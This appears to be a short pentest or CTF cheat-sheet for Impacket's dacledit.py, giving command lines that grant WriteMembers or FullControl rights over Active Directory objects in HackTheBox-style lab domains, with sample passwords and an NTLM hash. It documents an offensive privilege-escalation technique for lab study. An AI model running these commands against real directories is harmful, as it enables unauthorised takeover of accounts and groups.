# dacledit.py

## Overview

Python script to read and manage the Discretionary Access Control List of an object

## Usage

```shell
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
```

Give Full control - GenericAll acl

```shell
dacledit.py -action 'write' -rights 'FullControl' -principal '<username_of_new_owner>' -target '<username_being_owned>' '<domain_name>'/'<username_new_owner>':'<password_new_owner>'
```

```shell
impacket-dacledit -action write -rights FullControl -principal 'Haze-IT-Backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' -dc-ip haze.htb 'haze.htb/Haze-IT-Backup$' -hashes ':4de830d1d58c14e241aff55f82ecdba1'
```

If it is over an OU add inheritance:

```shell
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=adcs,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'password123!'
```